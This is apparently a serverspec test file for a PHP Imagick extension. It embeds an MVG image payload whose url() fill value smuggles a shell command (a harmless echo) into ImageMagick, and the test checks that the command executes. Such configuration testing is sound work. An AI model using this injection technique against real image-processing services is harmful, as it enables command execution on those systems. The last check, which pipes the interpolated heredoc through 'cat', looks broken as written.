require 'spec_helper'

malcode = <<EOF
<?php

  $mvg = "push graphic-context
        viewbox 0 0 640 480
        fill 'url(https://127.0.0.1/foo.jpg\"| echo \'You are 0wned...\'\")'
        pop graphic-context";
  $image = new \Imagick();
  $image->readImageBlob($mvg);
EOF

describe 'php5::extension::imagick::open-policy' do

  describe command('php --ri imagick') do
    its(:exit_status) { should eq 0 }
  end

  describe file('/var/log/php/error.log') do
    its(:content) { should_not match /Warning.*imagick.*already loaded/ }
  end

  describe command("cat #{malcode} | php") do
    its(:stdout) { should match /0wned/}
  end
end
